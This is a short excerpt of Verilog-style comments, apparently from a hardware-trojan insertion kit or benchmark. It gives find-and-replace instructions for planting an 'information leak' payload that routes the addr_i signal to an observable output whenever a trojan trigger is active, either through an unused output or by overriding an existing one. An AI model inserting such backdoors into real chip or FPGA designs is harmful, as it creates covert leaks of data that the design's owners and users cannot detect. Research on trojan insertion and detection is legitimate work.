 ...
 * Payload: Route addr_i to output
 * 
...
// ============================================================
// Information Leak: Route addr_i to observable output
//
...
//   Replace: assign unused_output = trojan_active ? addr_i[0] : 1'b0;
//
// OR modify existing output:
//   Find: assign some_output = normal_data;
//   Replace: assign some_output = trojan_active ? addr_i : normal_data;